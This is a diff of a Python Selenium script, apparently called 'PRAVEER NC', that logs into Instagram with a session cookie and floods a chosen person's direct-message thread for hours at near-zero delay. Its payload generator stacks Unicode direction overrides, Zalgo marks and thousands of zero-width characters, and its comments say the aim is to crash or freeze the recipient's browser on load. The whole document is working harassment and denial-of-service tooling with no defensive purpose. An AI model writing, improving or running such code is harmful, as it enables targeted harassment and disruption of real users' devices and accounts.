@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (CPU CRUSHER)
-# 📅 STATUS: COMPLEX SCRIPT BLOAT | 2 THREADS | 60s RESTART
+# 🚀 PROJECT: PRAVEER NC (RELOAD BREAKER)
+# 📅 STATUS: INIT-CRASH MODE | 2 THREADS | HYPER-SPEED
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,39 +9,35 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 
-# --- CPU CRUSHER CONFIG ---
+# --- RELOAD BREAKER CONFIG ---
 THREADS = 2             
 TOTAL_DURATION = 21600  
-BURST_SPEED = (0.01, 0.05) 
-SESSION_LIMIT = 60 # Ultra-short sessions to prevent self-lag
+BURST_SPEED = (0.01, 0.04) # Near-zero delay
+SESSION_LIMIT = 50 # Reloading our own browser faster to stay ahead
 
-GLOBAL_SENT = 0
-COUNTER_LOCK = threading.Lock()
-
-def get_cpu_crusher_payload(target):
-    """Generates text that is computationally expensive to render."""
-    # 1. Using Mathematical Alphanumeric Symbols (Heavy for GPU/CPU)
-    # These aren't standard fonts; they are complex vector shapes.
-    complex_praveer = "𝖯𝖱𝖠𝖵𝖤𝖤𝖱_𝖭𝖢_𝖮𝖶𝖭𝖲_𝖸𝖮𝖴"
+def get_reload_breaker_payload(target):
+    """Generates a payload designed to crash the browser during initial load."""
+    # Recursive Directional Overrides (The 'Layout Killer')
+    # This flips the browser's rendering direction back and forth instantly
+    direction_chaos = ("\u202E" + "\u202D") * 50 
     
-    # 2. Complex Script Overlay (Combining marks from multiple languages)
-    # This forces the browser to check multiple font libraries per character
-    combining_chaos = "⃢⃟⃞⃠⃤⃘⃚⃛⃜" 
+    # Mathematical Bold Script (High-cost vectors)
+    praveer_text = "𝐏𝐑𝐀𝐕𝐄𝐄𝐑_𝐍𝐂_𝐎𝐖𝐍𝐙_𝐘𝐎𝐔"
     
-    # 3. Recursive Zalgo Tower (Increased to 50 for max vertical bleed)
-    z_tower = "̸" * 50
+    # Mega-Zalgo (60 marks high)
+    z_tower = "̸" * 60
     
-    skyscraper = []
-    skyscraper.append(f"🔱 PRAVEER DOMINANCE: {target.upper()} 🔱")
+    # 5,000 character invisible 'buffer' to bloat the initial JSON response
+    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(5000))
     
-    for _ in range(20): # Increased height
-        # Mix complex shapes with high-density Zalgo and direction overrides
-        line = "".join(c + z_tower + combining_chaos for c in complex_praveer)
-        skyscraper.append(line)
-        # Adding RTL override mid-block to break the rendering engine's flow
-        skyscraper.append("\u202E" + "‎" * 500) 
-
-    return "\n".join(skyscraper)
+    lines = []
+    lines.append(f"☢️ RELOAD FAILED: {target.upper()} ☢️")
+    lines.append(bloat)
+    for _ in range(25): # Massive Vertical Wall
+        lines.append(direction_chaos + praveer_text + z_tower)
+    lines.append(bloat)
+    
+    return "\n".join(lines)
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -49,10 +45,11 @@ def get_driver(agent_id):
     chrome_options.add_argument("--no-sandbox") 
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
-    # Disabling font antialiasing forces the CPU to work harder on complex shapes
-    chrome_options.add_argument("--disable-font-subpixel-positioning")
+    # Forces the browser to ignore cache, making every reload of theirs slower
+    chrome_options.add_argument("--disk-cache-size=1")
+    chrome_options.add_argument("--media-cache-size=1")
     
-    temp_dir = os.path.join(tempfile.gettempdir(), f"crusher_{agent_id}_{int(time.time())}")
+    temp_dir = os.path.join(tempfile.gettempdir(), f"breaker_{agent_id}_{int(time.time())}")
     chrome_options.add_argument(f"--user-data-dir={temp_dir}")
     return webdriver.Chrome(options=chrome_options)
 
@@ -70,9 +67,8 @@ def adaptive_inject(driver, text):
     except: return False
 
 def run_life_cycle(agent_id, cookie, target):
-    global GLOBAL_SENT
-    start_time = time.time()
-    while (time.time() - start_time) < TOTAL_DURATION:
+    global_start = time.time()
+    while (time.time() - global_start) < TOTAL_DURATION:
         driver = None
         session_start = time.time()
         try:
@@ -80,18 +76,16 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(6)
+            time.sleep(5)
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(7)
+            time.sleep(6)
 
             while (time.time() - session_start) < SESSION_LIMIT:
-                payload = get_cpu_crusher_payload(os.getenv("TARGET_NAME", "User"))
+                payload = get_reload_breaker_payload(os.getenv("TARGET_NAME", "Target"))
                 if adaptive_inject(driver, payload):
-                    with COUNTER_LOCK:
-                        GLOBAL_SENT += 1
-                        print(f"[!] CPU IMPACT {GLOBAL_SENT} | MODE: CRUSHER", flush=True)
+                    print(f"[!] BREAK-SENT | MODE: RELOAD_KILLER", flush=True)
                 time.sleep(random.uniform(*BURST_SPEED))
-        except Exception: pass 
+        except: pass 
         finally:
             if driver: driver.quit()
             gc.collect()
